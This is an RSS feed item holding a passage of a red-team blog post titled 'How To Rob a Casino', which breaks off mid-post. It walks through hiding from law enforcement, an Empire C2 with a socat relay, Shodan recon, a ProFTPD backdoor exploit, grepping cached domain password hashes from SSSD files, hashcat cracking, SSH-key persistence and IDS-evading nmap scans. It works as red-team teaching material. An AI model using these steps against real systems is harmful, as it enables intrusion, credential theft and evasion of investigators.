<?xml version="1.0" encoding="UTF-8" ?>
<rss version="2.0" xmlns:discourse="http://www.discourse.org/" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
  <channel>
    <title>0x00sec - The Home of the Hacker - Latest topics</title>
    <link>https://0x00sec.org/latest</link>
    <description>Latest topics</description>
    
      <lastBuildDate>Thu, 16 May 2024 12:43:30 +0000</lastBuildDate>
      <atom:link href="https://0x00sec.org/latest.rss" rel="self" type="application/rss+xml" />
        <item>
          <title>How To Rob a Casino</title>
          <dc:creator><![CDATA[dmcxblue]]></dc:creator>
          <category>Red-Team</category>
          <description><![CDATA[
            <p>Casinos, some view these places as something that corrupts the soul, leading individuals astray with the allure of easy money and instant gratification. Others see casinos as an escape from reality, seeking temporary relief from stress, boredom or dissatisfaction and for others it represents hope, offering the possibility of a better life through luck or skill.</p>
<p>But hackers?</p>
<p>An opportunity, a challenge, a game. Here we go again gentlemen Tropicana is back but this time besides the fact of saving your money, now it’s taking it as a gamble. This inspiration of a blog comes again from the Hacker Manifesto from Phineas Phisher [1] “bad guys”, the law, the “system” all trying to capture the “bad guy” who is stealing our money but is the bank here to protect us??[2].</p>
<p>But let’s forget about that, were here to Rob a casino, but ……. How do we do it? I’m no expert but I can recreate scenarios where it happened, replicate, and demonstrate some ideas on what tactics or techniques may or may not be used. Remember in the previous blog how we mentioned “Teach a man how to Phish” well it’s funny how the fish will be somewhat be involved [3].</p>
<p>Now I always try to demonstrate examples where people can have access and learn via Open Source tooling, in the last post on “How to Rob a Bank”[4] we worked with the Havoc[5] framework and amazing open source C2 that was built by a teenager trying to learn malware and that was working on it for 2 years before releasing it to us mortals. Please as mentioned previously don’t take this as a “Guide” a “How To” or a “Manual” because the infrastructures related to Casino’s, Banks, Treasury it’s quite different and here it’s just a simulation or is it?!?![6].</p>
<p>[1] <a href="https://unicornriot.ninja/wp-content/uploads/2019/11/hackback-announce-text.txt" rel="noopener nofollow ugc">https://unicornriot.ninja/wp-content/uploads/2019/11/hackback-announce-text.txt</a></p>
<p>[2] <a href="https://www.nytimes.com/2022/03/06/business/payments-fraud-zelle-banks.html" rel="noopener nofollow ugc">https://www.nytimes.com/2022/03/06/business/payments-fraud-zelle-banks.html</a></p>
<p>[3] <a href="https://www.washingtonpost.com/news/innovations/wp/2017/07/21/how-a-fish-tank-helped-hack-a-casino/" rel="noopener nofollow ugc">https://www.washingtonpost.com/news/innovations/wp/2017/07/21/how-a-fish-tank-helped-hack-a-casino/</a></p>
<p>[4] <a href="https://0x00sec.org/t/how-to-rob-a-bank/37022" class="inline-onebox">How To Rob a Bank</a></p>
<p>[5] <a href="https://github.com/HavocFramework/Havoc" class="inline-onebox" rel="noopener nofollow ugc">GitHub - HavocFramework/Havoc: The Havoc Framework.</a></p>
<p>[6] <a href="https://www.youtube.com/watch?v=t-Nz6us7DUA" rel="noopener nofollow ugc">Morpheus explains what is real</a></p>
<p>—-[ Preparation ]———————————————————————————————————–</p>
<p><em>“Give me six hours to chop down a tree and I will spend the first four sharpening the axe.”</em></p>
<p>Building the infrastructure is an important part of handling your security, OPSEC and post-exploitation techniques that you will be working on once inside the network.</p>
<p>Security, staying safe on the internet is of upmost importance if you are going to hack a Casino right? I mean if the feds are knocking at your door that means you did something wrong already, but we don’t need to worry as we have some small tips for a strong infrastructure.</p>
<p><em><strong>VPN</strong></em></p>
<p>VPNs have some popularity that has been known to hackers already[1][2][3] in a bad or good way about these products, so do whatever you want with this information, now that we have the “PARENT” of all proxies and VPNs, we can consider the Tor Network but it also comes with some controversial problems [4][5] uncle Sam is always peeping and they can be creative as well.</p>
<p>But with all these things going on what can we do???</p>
<p>Piggyback onto another Wi-Fi maybe build a cantenna [6] and grab that Wi-Fi from a mile away or buy some remote access into already hacked devices and do your deeds there? But remember IP Logs! I am aware of proxies, but I am not familiar with how good they can be.</p>
<p>But here are some VPN that claim they don’t keep logs; these are suggestions as one would say just consider them and do some due diligence with your research.</p>
<p><em><strong>Virtualization and Encryption</strong></em></p>
<p>Run everything from a virtual machine there are multiple services available VMWare, VirtualBox, QEMU, Hypervisor [7][8][9][10] I’ve delved into this topic previously but still a good reminder, some of these VMs come with the ability to encrypt the Disks but there is no harm in manually applying another layer inside the VM.</p>
<p>[1] <a href="https://www.zdnet.com/article/cyberstalker-thwarted-by-vpn-logs-gets-17-years-in-prison/" rel="noopener nofollow ugc">https://www.zdnet.com/article/cyberstalker-thwarted-by-vpn-logs-gets-17-years-in-prison/</a></p>
<p>[2] <a href="https://surfshark.com/blog/can-police-track-vpn" rel="noopener nofollow ugc">https://surfshark.com/blog/can-police-track-vpn</a></p>
<p>[3] <a href="https://www.theregister.com/2011/09/26/hidemyass_lulzsec_controversy/" class="inline-onebox" rel="noopener nofollow ugc">HideMyAss defends role in LulzSec hack arrest • The Register</a></p>
<p>[4] <a href="https://gizmodo.com/fbi-tor-ip-address-muhammed-momtaz-al-azhari-isis-1849975153" class="inline-onebox" rel="noopener nofollow ugc">How Did the FBI Get Muhammed Al-Azhari's IP Address From Tor?</a></p>
<p>[5] <a href="https://www.linkedin.com/pulse/fbi-can-track-locate-suspects-using-tor-still-secure-julian-wendt/" class="inline-onebox" rel="noopener nofollow ugc">FBI Can Track and Locate Suspects Using TOR. Is TOR Still Secure?</a></p>
<p>[6] <a href="https://www.instructables.com/DIY-Wifi-Extender-Cantenna-build-with-a-stand/" rel="noopener nofollow ugc">https://www.instructables.com/DIY-Wifi-Extender-Cantenna-build-with-a-stand/</a></p>
<p>[7] <a href="https://www.vmware.com/" rel="noopener nofollow ugc">https://www.vmware.com/</a></p>
<p>[8] <a href="https://www.virtualbox.org/" rel="noopener nofollow ugc">https://www.virtualbox.org/</a></p>
<p>[9] <a href="https://www.qemu.org/download/" class="inline-onebox" rel="noopener nofollow ugc">Download QEMU - QEMU</a></p>
<p>[10] <a href="https://medium.com/@liam.cafearo/setting-up-hyper-v-and-a-kali-linux-virtual-machine-1a76bb4fa0f" class="inline-onebox" rel="noopener nofollow ugc">Setting up Hyper-V and a Kali Linux Virtual Machine | by Liam Cafearo | Medium</a></p>
<p>—-[ Infrastructure ]————————————————————————————————————-</p>
<p>You managed to hide your tracks and think that you are in the clear that Big Brother is no longer watching your tracks, good!! But you need to build your infrastructure now, our server, redirectors and strong OPSEC so they don’t find you. Here are some “Tips and Tricks” to be careful.</p>
<p>The C2 Server</p>
<p>In this example will be using the Empire [1] C2 Framework, I know in the previous one I was working with Havoc, and as much of a fan I am I want to demonstrate that there is no “right” way of thinking don’t learn about the tool, learn about the technique that the tool takes advantage of. Maybe mimikatz for example grabs credentials from the LSASS process but is that it?! Is that the only place where there are passwords? Not really, Cookies, Files, Browsers they all contain that loot we are looking for, so that’s why I am working in using another C2 for this article, blog, whatever it’s considered to be.</p>
<p><em>“To understand the technique.”</em></p>
<p>I don’t want to get much into detail for installing and running empire but if you follow the wiki setup should be simple to install using an officially supported OS but in my case, I will be using a Docker[2] as Empire has no official support for BlackArchLinux, Dockers are a great way for temporary use, they can be created and destroyed in a breeze, when setting up your C2 we have to change it up a little, Ports, Headers, Obfuscation, the default settings are great but they are also well known, leave a new fingerprint every time you work these tools have been updated and modernized to use the latest techniques leaving stuff with the default settings nowadays is a great way to get you caught.</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-153.png?w=624" alt="" width="624" height="458" role="presentation"></p>
<p>Now we can’t just have our server facing the internet in default values you’ll get caught!![3] first will need some similar domains to the target as we are trying to blend in with our network traffic, to make sure it doesn’t look suspicious when we are moving inside the network or if we ever do phishing we will try to look the least suspicious as possible, C2s allow us to use something called Malleable[4] profiles to blend our traffic when our agent, beacon, demon calls back to us the traffic it uses is similar to common malicious connections so we have to make it look legitimate not simple connections where our commands and output can be easy to read from, a step into blending our traffic is finding legitimate expired domains[5] that we can use on our HTTP traffic.</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-154.png?w=423" alt="" width="423" height="231" role="presentation"></p>
<p>These examples were available to purchase maybe previous owners just didn’t have the need to continue with the domain. These domains are a good approach as Domain Categorization where AV/EDR or network product categorizes [6] a Domain to understand what’s it doing and what’s it meant for, so this is already done for you, but the process of aging still has to be looked on since registrations are shown as recent they were even if they are expired domains.</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-155.png?w=537" alt="" width="537" height="141" role="presentation"></p>
<p>Now that the domains are set for mixing our net traffic will need some relays, these work in the benefit of pointing our implants away from our server, if our server gets burned, we need to build it again and we don’t want to start all over again. Setting up relays is quite simple utilizing socat [7] with the following command:</p>
<pre><code class="lang-auto">socat -v TCP-LISTEN:4444,fork TCP:C2SERVER:4444
</code></pre>
<p>We listen on Port 4444 and relay all traffic to our server on the same port. We will verify this by setting up Wireshark to ensure our payload calls the relay instead of the real server. This way, if IP blocking is in place, our relay server will be flagged instead of our C2 server, and setting up a new relay is way faster than a new server.</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-156.png?w=624" alt="" width="624" height="338" role="presentation"></p>
<p>This is a simple redirector. There are legitimate services that can relay our connections and be more OPSEC about it [8][9][10]?? It’s just about being creative in this example all I am doing is just forwarding the TCP connections to my server.</p>
<p>You can notice on the screenshot that Wireshark only sees the IP Relay as the Destination but can’t see beyond that, so the server stays safe from prying eyes. Let’s add more layers of evasion into our infrastructure, another service for applying more security is Apache [11], Apache contains methods to Block IPs, allow only certain requests that contain certain values to have access onto our C2 Server.</p>
<p>—-[ Blocking IPs]—————————————————————————————————————-</p>
<p>Pretty simple locate your configuration file in the  and place the IP or IP Range that you’d like to block.</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-157.png?w=247" alt="" width="247" height="104" role="presentation"></p>
<p>If I try to access the resource I get denied</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-158.png?w=624" alt="" width="624" height="143" role="presentation"></p>
<p>—-[ Custom Headers]———————————————————————————————————–</p>
<p>Now let’s remove it and try with specific values, let’s say Apache will only grant you access if there’s a specific Header in your request and if it doesn’t exist then it won’t allow you.</p>
<p>We will need to enable some modules that have been commented out:</p>
<p>LoadModule rewrite_module modules/mod_rewrite.so</p>
<p>LoadModule headers_module modules/mod_headers.so</p>
<p>From here will edit the  tag again placing the following values</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-159.png?w=486" alt="" width="486" height="144" role="presentation"></p>
<p>Requesting again to access the server with the specified Header will be the only way to gain access.</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-160.png?w=624" alt="" width="624" height="380" role="presentation"></p>
<p>Apache has numerous options and security layers that can be added to their configuration play around and check ideas on what can you do to strengthen your infrastructure.</p>
<p>[1] <a href="https://github.com/EmpireProject/Empire" class="inline-onebox" rel="noopener nofollow ugc">GitHub - EmpireProject/Empire: Empire is a PowerShell and Python post-exploitation agent.</a></p>
<p>[2] <a href="https://bc-security.gitbook.io/empire-wiki/quickstart/installation#docker" class="inline-onebox" rel="noopener nofollow ugc">Installation | Empire Wiki</a></p>
<p>[3] <a href="https://twitter.com/MichalKoczwara/status/1657090134129401866" rel="noopener nofollow ugc">https://twitter.com/MichalKoczwara/status/1657090134129401866</a></p>
<p>[4] <a href="https://unit42.paloaltonetworks.com/cobalt-strike-malleable-c2-profile/" class="inline-onebox" rel="noopener nofollow ugc">How the Malleable C2 Profile Makes Cobalt Strike Difficult to Detect</a></p>
<p>[5] <a href="https://www.expireddomains.net/" rel="noopener nofollow ugc">https://www.expireddomains.net/</a></p>
<p>[6] <a href="https://urlfiltering.paloaltonetworks.com/query/" class="inline-onebox" rel="noopener nofollow ugc">Palo Alto Networks URL filtering - Test A Site</a></p>
<p>[7] <a href="https://linux.die.net/man/1/socat" rel="noopener nofollow ugc">https://linux.die.net/man/1/socat</a></p>
<p>[8] <a href="https://0xdarkvortex.dev/c2-infra-on-azure/" class="inline-onebox" rel="noopener nofollow ugc">A Thousand Sails, One Harbor - C2 Infra on Azure</a></p>
<p>[9] <a href="https://labs.jumpsec.com/obfuscating-c2-during-a-red-team-engagement/" rel="noopener nofollow ugc">https://labs.jumpsec.com/obfuscating-c2-during-a-red-team-engagement/</a></p>
<p>[10] <a href="https://medium.com/trainingdock/http-redirects-with-lambda-c20cf7934060" class="inline-onebox" rel="noopener nofollow ugc">HTTP Redirects with Lambda. In this recipe, we cover: | by fkaz | TrainingDock | Medium</a></p>
<p>[11] <a href="https://httpd.apache.org/" rel="noopener nofollow ugc">https://httpd.apache.org/</a></p>
<p>—-[ Recon ]———————————————————————————————————————–</p>
<p>Now recon has been the golden step for Red Teamers, Penetration Testers, APTs, Doctors, Scientists, you name it, this step is crucial for moving forward it helps you decide on what needs to be done next, the informed decisions you can take once you are on the network, maybe you don’t need to Privilege Escalate if your current users have the required permissions maybe Initial Access is our target but the information gathered on the version of Office that they are working with 2013, 2016, o365??. These files can hold valueable information that we can utilize for our External or Internal Enumeration, they contain tons of valueable data some of that data is called Metadata [1] looking at a file grabbed from the Casino’s website for a Job Posting demonstrates the user who created this file below.</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-161.png?w=561" alt="" width="561" height="189" role="presentation"></p>
<p>This information comes in handy when we are weaponizing our payloads to send to our target this method can be used if we were applying a password spraying technique or targeting specific users on the enterprise to avoid the issues of Spam make more rational and targeted phishing campaigns, as mentioned in the previous post “How to Rob a Bank, but in this scenario there is no need for Phishing since we found an IOT[2] (Internet Of Things) connected to the Internet, here will look at some resources to find some data that we can utilize when Enumerating externally.</p>
<p>What I like to do with this info now that I have a full name, sometimes you will get an internal username instead of a name like this one, but if that is not the case utilizing namemash.py [3] is a great method to build usernames to find the naming convention used internally</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-162.png?w=624" alt="" width="624" height="262" role="presentation"></p>
<p>We can avoid scanning ports and services by checking out other places that did this for us. For example, Shodan [4] a popular “HACKER” search engine, and well known for scanning the internet for open ports on IOTs, Shodan has an incredible API that we can utilize in the Command-Line Interface here is an example of finding information about hosts, such as IP, HOSTNAME, PORT AND SERVCE</p>
<pre><code class="lang-auto">shodan search --fields ip_str,port,org,hostnames "Golden FTP"
</code></pre>
<p>The results of this scan are quite impressive but hidden as I don’t want to show vulnerable or potential targets but in seen below, I’ve targeted port 21 to be specific where I know the FTP protocol and services are running a potential initial access vector since it can give me RCE or even anonymous file access.</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-163.png?w=624" alt="" width="624" height="387" role="presentation"></p>
<p>Now that we have located potential targets, we can now request a scan on the target we are interested in and gather a more detailed view on the information we are looking at.</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-164.png?w=546" alt="" width="546" height="252" role="presentation"></p>
<p>I do recommend verifying the Data manually if you can, since Shodan scans are just snapshots of when Shodan did the scan itself, once you proceed verifying this info yourself then it might yield you different results.</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-165.png?w=624" alt="" width="624" height="174" role="presentation"></p>
<p>Now I’ll be using some open source tooling built in the python language, I do recommend when working with Python tools to create a virtual environment this way you don’t break none of the other dependencies on your system and it’s a cleaner way to have an environment you can remove at any time, now I did not use this in the Shodan example because the tool was already pre-installed but a recommendation just in case you need to use something from GitHub</p>
<pre><code class="lang-auto">python3 -m venv python-environment

To access or start your virtual environment you would need the source command.

source python-environment/bin/activate
</code></pre>
<p>Now with that you will notice a new location set on your terminal path along with the username and hostname when this is all set and done, installing old or new python tools has been simplified with the safety of not forcing or breaking packages form your OS.</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-166.png?w=579" alt="" width="579" height="63" role="presentation"></p>
<p>I can run and install Spadefoot[5] without any issues inside the environment it would open a web page with the interface and options to start scanning our target be it a webpage or IP Address it’s a powerful tool for reconnaissance with options ranging in the passive to active scanning it will dive as deep as you allow it to for finding any valueable data related to our target the scanning is time consuming so research and look for other places while this is done and come back to at a later time</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-167.png?w=624" alt="" width="624" height="227" role="presentation"></p>
<p>Placing your tools in a virtual environment can be quite powerful and helpful to keep everything neatly organized and functional without the need to break your OS with all the extra unnecessary packages that one tool might require. I advise looking at the IoT Methodology [6] to have an idea on how to approach attacking stuff like this.</p>
<p>[1] <a href="https://en.wikipedia.org/wiki/Metadata#:~:text=Metadata%20means%20%22data%20about%20data,working%20with%20specific%20data%20easier" class="inline-onebox" rel="noopener nofollow ugc">Metadata - Wikipedia</a>.</p>
<p>[2] <a href="https://www.oracle.com/internet-of-things/what-is-iot/" class="inline-onebox" rel="noopener nofollow ugc">What Is the Internet of Things (IoT)?</a></p>
<p>[3] <a href="https://raw.githubusercontent.com/krlsio/python/main/namemash.py" rel="noopener nofollow ugc">https://raw.githubusercontent.com/krlsio/python/main/namemash.py</a></p>
<p>[4] <a href="https://www.shodan.io/" rel="noopener nofollow ugc">https://www.shodan.io/</a></p>
<p>[5] <a href="https://github.com/smicallef/spiderfoot" class="inline-onebox" rel="noopener nofollow ugc">GitHub - smicallef/spiderfoot: SpiderFoot automates OSINT for threat intelligence and mapping your attack surface.</a></p>
<p>[6] <a href="https://github.com/inguardians/IoTA" class="inline-onebox" rel="noopener nofollow ugc">GitHub - inguardians/IoTA: The Internet of Things Attack (IoTA) Methodology</a></p>
<p>—-[ Initial Access ]—————————————————————————————————————</p>
<p>In 2017, the most creative casino [1] breach occurred in the US. Rather than employing sophisticated techniques like 0-day exploits, phishing, or polymorphic self-encrypting malware, the attackers took a simpler route: they accessed a fish tank thermometer. This Linux-based thermometer, connected to the internet is part of the Internet of Things (IoT), it was linked to the same network hosting the casino’s internal infrastructure. IOTs are a great for deployment and have its conveniences for the user but they also have problems[2] IOTs to my experience are still a vast pool of the unknown but amazing individuals have jumped and started looking into these potentially broken devices, now for this example we won’t need to go that far since Metasploit[3] has the sufficient functions for us to gain Initial Access starting with a port scan will locate services with potential vulnerabilities that can allow use to gain access.</p>
<p>There are multiple tools that we can utilize to achieve our goals, some of them are actually combined with well-known ones such as rustscan[4] or custom ones written in your favorite language but here I will be using some methods just for verification and demonstration that sometimes all these tools won’t be available and creativity is what would help here, our first method is using the popular port scanner nmap[5] which needs no introduction as it’s the most popular well known pentester/redteam/blueteam tool known to man now take a look at the output below:</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-168.png?w=624" alt="" width="624" height="343" role="presentation"></p>
<p>Notice the detail of the scan, and the methods used such as the -sC (Safe Scripts) and -sV (Version) this information has been fingerprinted to be running on a OS: Ubuntu type but I want to show you this because we can’t just trust 1 tool or 1 method doesn’t matter how popular or useful it can be, always verify the information, QUESTION EVERYTHING[6] now another method I simply used the ncat tool to connect to a port, do some banner grabbing and confirm the port is actually open and reachable.</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-169.png?w=624" alt="" width="624" height="270" role="presentation"></p>
<p>I’ve confirmed that the ports are open, and I can interact with them so I can proceed with more enumeration and proceed with some vulnerability scanning and check the possibilities of exploits available where I can gain my first access.</p>
<p>Now a common methodology is to start looking for low hanging fruit, or the quick wins for these methods, will start in a simple order from top to bottom, normally this is not the approach taken with more professional pentesters as they can tell by experience, the ports that might give them those quick wins. In this example it’s port 21 to locate potential exploits with an offline tool named searchsploit [7] a great terminal alternative to exploitdb which allows you to quickly access workable exploits and documentation offline.</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-170.png?w=624" alt="" width="624" height="89" role="presentation"></p>
<p>I investigated this exploit by using the X flag. We can get more details about it if it’s available the info is usually inside the description of the exploit or sometimes, they contain a txt file that gives a more detailed description about the exploit.</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-171.png?w=621" alt="" width="621" height="202" role="presentation"></p>
<p>So there seems to be a backdoor on this version of ProFTPD, if we read the module from Metasploit we can find out the backdoor command sent to ProFTPD to gain a root shell.</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-172.png?w=354" alt="" width="354" height="42" role="presentation"></p>
<p>Great now I’ve gained Initial Access onto the Casino’s Internal Network</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-173.png?w=624" alt="" width="624" height="99" role="presentation"></p>
<p>Now that I finally have Initial Access onto the network it’s time to get into more hacking, getting around the systems, reach domain admin, dump some credz, evade some defenses, some tricks to reach our goal. Since enumeration is always key to decide what’s our next step onto the network let’s work with Ubuntu here for some AD (Active Directory) enumeration, it’s a little tricky since most tools are mostly written for Windows environments, some people are unaware that Ubuntu can be added [8] to the AD as well! But before continuing let’s upgrade [9] our shell to have a more stable terminal interaction.</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-174.png?w=440" alt="" width="440" height="126" role="presentation"></p>
<p>Perfect, moving forward should be a breeze, let’s check where we are and grab some info on the domain, locate some users, find any other computers on the AD a bunch to work on to reach our goal using the realm tool which is a tool needed to join an AD network with Ubuntu.</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-175.png?w=358" alt="" width="358" height="352" role="presentation"></p>
<p>Let’s check for any local users finding these can also give us an idea on how the workflow is worked on, local accounts are a common thing for when a workstation is being set up for the first time , back in my IT days we’d have 1 local master account to add the AD infrastructure and necessities but the local master account was never removed or even changed to give it less permissions!!!. But oh well what can you do ¯_(ツ)_/¯</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-176.png?w=434" alt="" width="434" height="102" role="presentation"></p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-177.png?w=87" alt="" width="87" height="26" role="presentation"></p>
<p>Only one local user, now the interesting part is to enumerate the Active Directory now, but since we don’t hold credentials for our a domain user and some methods and tools require credentials I’ll need to locate a potential user first by using the “w” command we can see if there are any active users on the machine that may give us an idea of the users that are available, the time they logged in, IDLE time and much more information this can also point out the naming convention of the internal AD users.</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-178.png?w=624" alt="" width="624" height="84" role="presentation"></p>
<p>Locating our first AD user with this helps us move forward now we can probably brute force usernames, locate more users, workstations and network connections to make sure that we can move laterally and if there’s an option to get around, but we need credentials since I don’t have much experience in locating hashes for the AD user in Ubuntu I had to do some research for this, in my scenario I found the hashes here:</p>
<pre><code class="lang-auto">grep -a "cachedPassword" /var/lib/sss/db/*
</code></pre>
<p>Using these hashes with hashcat we get a chance to crack these hashcat is a powerful tool for cracking passwords hashes with multiple options and features to help us achieve our goal of gaining cleartext credentials from a hash it’s simply a great tool to have in your arsenal, moving forward I used a command to lcoate me these hashes.</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-179.png?w=437" alt="" width="437" height="22" role="presentation"></p>
<p>Once located you can pass the hash onto hashcat and attempt to crack it, the password here was successfully cracked since it was a combination of Season + Year which is a common combination of weak passwords. Don’t be afraid of trying simple and well known credentials, they are still really common. I like to use rules as well, and you should be using rules since they mutate the words to find potential passwords such as Password → P@$$w0rd.</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-180.png?w=624" alt="" width="624" height="227" role="presentation"></p>
<p>To proceed in enumerating the AD we need some information about where the DC is located, you can run an nmap scan internally and try to find it by checking out your output, but this could be quite noisy, I used the adcli[10] command-line tool to get this information as it’s another tool that comes installed in Linux machines that were joined in a domain:</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-181.png?w=624" alt="" width="624" height="188" role="presentation"></p>
<p>Now the AD tools commonly use have been built for Windows environments but there are some great people out there that have built versions of these tools capable to run on Linux using python[11][12]but there are also built in tools in Linux that we can utilize such as LDAPSEARCH[13] the queries can be quite tricky and complicated to learn, so I do recommend testing these commands before running them to avoid crashing your shell and having a cheat sheet when you need to enumerate certain information on the domain</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-182.png?w=624" alt="" width="624" height="420" role="presentation"></p>
<p>On the screenshot above I enumerated the Domain Users seeing if I can find anything interesting such as finding passwords in the “Description Section” or users that belong to interesting groups, we can also look for SPN values that may allow us to use the Kerberoasting[14] attack and gain another users cleartext password but only experience will benefit us if we know some of the AD scenarios and techniques, if we are brand new to this only research will help us move forward. In the following screenshot I enumerated the available workstations</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-183.png?w=624" alt="" width="624" height="445" role="presentation"></p>
<p>In the above screenshot I am currently in the BCK-WKN1 workstation my goal is to move in this direction</p>
<pre><code class="lang-auto">BCK-WKN1 -&gt; BCK-WKN2 -&gt; GD-WKN1 -&gt; IT-WKN1
</code></pre>
<p>Now even though this output is great and all running tools on the host is kind of a “No, no” we may want to run a proxy onto the targeted workstation and run our custom tools with no issues of being detected in terms of local security products, since our tools are running in our controlled environment.</p>
<p>Before proceeding I should place persistence in case that my connection dies, the server reboots or any shenanigans since I am in a Linux machine my most comfortable course of action is to work with SSH by editing the configuration file I can allow it to use a private key for access instead of a password which I still don’t know, so on my attacker machine I should create a key:</p>
<pre><code class="lang-auto">ssh-keygen -t rsa -b 4096
</code></pre>
<p>When my key has been created, I can copy the id_rsa.pub key and copy its contents and place them in the remote workstation in a file named authorized_keys with that I can login using my private key that I’ve created on my attacking machine and login with a more stable terminal.</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-184.png?w=450" alt="" width="450" height="153" role="presentation"></p>
<p>And now I have a more stable and fully functional terminal, I’ve learned to work with this method if you’ve played HackTheBox in the past you will find familiar techniques or resources that I’ll point to so you can try them yourself, I try to live in Open Source as possible to show you that not everything is a complicated tool or technique.</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-185.png?w=624" alt="" width="624" height="321" role="presentation"></p>
<p>Now with persistence in place via SSH setting up a Dynamic Port Forwarding using the -D 9999 is my next step so I can pass my tools via proxy and gather information as I would from the remote host but this time not worrying about dependencies or other issues since they are pre-installed or fully functional from my host with pywerview [15] I gather Domain User information.</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-186.png?w=624" alt="" width="624" height="89" role="presentation"></p>
<p>I saved the output to JSON and beautified it using the jq [16] tool</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-187.png?w=624" alt="" width="530" height="499" role="presentation"></p>
<p>Searching for Domain Computers with pywerview should be quite simple and now I can focus on filtering out information I would like to gather, the project is quite interesting in the methods it uses for the information it queries, by utilizing LDAP to query this I would consider it a slightly more OPSEC friendly method to gather the information as other tools that use PowerShell or C# tend to use well known protocols and methods such as Windows APIs that’s why it’s a great skill to know you’re way around different Operating Systems</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-188.png?w=525" alt="" width="525" height="422" role="presentation"></p>
<p>For locating services and open ports running on computers in the internal network I will use the nmap port scanner to find potential attacks for moving laterally but I also want to consider the fact that I am being watched, nmap has great tools for spoofing, evasion and such that can help me scan these ports more quietly and still effective I targeted specific ports that I guessed should be opened on the network, here is the command I used:</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-189.png?w=624" alt="" width="624" height="181" role="presentation"></p>
<p>A brief explanation on the commands I used below, I didn’t use all the options but do play around and experiment:</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-190.png?w=624" alt="" width="624" height="235" role="presentation"></p>
<pre><code class="lang-auto">-------------------------[Nmap]----------------------------------------------------

-f: The -f option causes the requested scan (including host discovery scans) to use tiny, fragmented IP packets. The idea is to split up the TCP header over several packets to make it harder for packet filters, intrusion detection systems, and other annoyances to detect what you are doing.

--script-args http.userganet: This option helps me change the default value of the header used for nmap when it's scanning I can pass by as an iPhone, Windows, Printer, Android any device I want to blend in with the network traffic instead of just sending a big red flag that says "Nmap Engine"

--randomize-hosts: I don't want to scan in order since you can tell that something is going on, on the network because a scan is being done from top to bottom but if you can make it look random you have a better chance to blend in

-D: Decoys are sent to the network to try and spoof the source of where the real port scanning is coming from

Do play around there are other great options such as slow scanning, changing the fragmented packet sizes use a source port to show that the port is coming from a legitimate source like port 80, experiment.

-------------------------[Nmap]----------------------------------------------------
</code></pre>
<p>I’ve located my next move which is BCK-WKN2 it’s time to restart my enumeration and follow the process again, looking for low-hanging fruits, vulnerability scanning, exploitation and so on:</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-191.png?w=624" alt="" width="624" height="187" role="presentation"></p>
<p>Taking a quick look at port 80 since it has the most potential in terms of exploitation as internal web applications tend to be vulnerable to some serious exploits since they don’t have the development time for focusing on security, companies tend to ignore these facts just because “they aren’t facing the internet” but hey it’s good for us, a web application scanner I like to use as of lately is nuclei[17] a fast vulnerability scanner designed to probe modern applications, infrastructure, cloud platforms, and networks, aiding in the identification and mitigation of exploitable vulnerabilities, powerful tool that can be customized and add even more custom attacks, the templates are based on YAML so some work to get used to. The scan shown below demonstrates an LFI[18] vulnerability</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-192.png?w=624" alt="" width="624" height="196" role="presentation"></p>
<p>[! WARNING]</p>
<p>Do be careful with using scanners on internal networks the default settings are usually running at high speeds sending multiple requests per second, if not careful you can crash the application and give yourself away.</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-193.png?w=624" alt="" width="624" height="155" role="presentation"></p>
<p>Let’s look at the website and test this vulnerability manually we can use the web browser or do a simple curl command with the example given by nuclei.</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-194.png?w=624" alt="" width="624" height="293" role="presentation"></p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-195.png?w=624" alt="" width="624" height="196" role="presentation"></p>
<p>Seen above, notice the output from curl we can read files on the remote workstation, this gives us some potential stuff to look at and gain some access to the remote workstation.</p>
<p>[1] <a href="https://cyberhound.com/the-great-fish-tank-hack/" rel="noopener nofollow ugc">https://cyberhound.com/the-great-fish-tank-hack/</a></p>
